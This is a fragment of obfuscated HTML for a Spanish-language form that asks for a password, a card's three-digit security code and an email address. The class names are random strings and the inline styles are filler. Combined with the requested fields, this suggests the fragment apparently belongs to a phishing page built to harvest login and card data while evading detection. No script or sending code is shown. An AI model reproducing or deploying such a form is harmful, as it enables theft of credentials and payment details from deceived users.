			...
			<div class="nc0LxTjk col-12 col-md-5 b1jLi mt-0 mt-md-5 mt-md-5 evpKCa5UEK" style="unicode-bidi:initial;unicode-bidi:initial;flood-color:currentcolor;">
					...
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="clave" class="EKm7Ucfqh4W">Clave</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="password" id="clave" name="password" placeholder="" minlength="4" maxlength="50" required>
				...
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="codigo" class="EKm7Ucfqh4W">Codigo de seguridad (3 digitos al dorso)</label>
								<input style="flood-color:currentcolor;scale:initial;scale:initial;" class="YiAwyEO" type="text" id="codigo" name="codigo" placeholder="" minlength="2" maxlength="3" required>
								</div>
							</div>
				<div class="IJf7CxJ row d-flex justify-content-center qoMxM contenedor_caja gQN9ll2gClQE7b mb-5" style="writing-mode:inherit;scale:initial;flood-color:currentcolor;">
					<div style="writing-mode:inherit;unicode-bidi:initial;flood-color:currentcolor;" class="BTKlYF7 col-12 8KeS3O9X form-padding">
						<div style="writing-mode:inherit;unicode-bidi:initial;font-kerning:initial;" class="row RSJkPtqrw9an3ZS">
							<div style="writing-mode:inherit;scale:initial;font-kerning:initial;" class="input ljlKMvjXydDI col-12 I7DZXKCvsLK mt-2">
								<label style="writing-mode:inherit;font-kerning:initial;unicode-bidi:initial;" for="clave" class="EKm7Ucfqh4W">Correo</label>
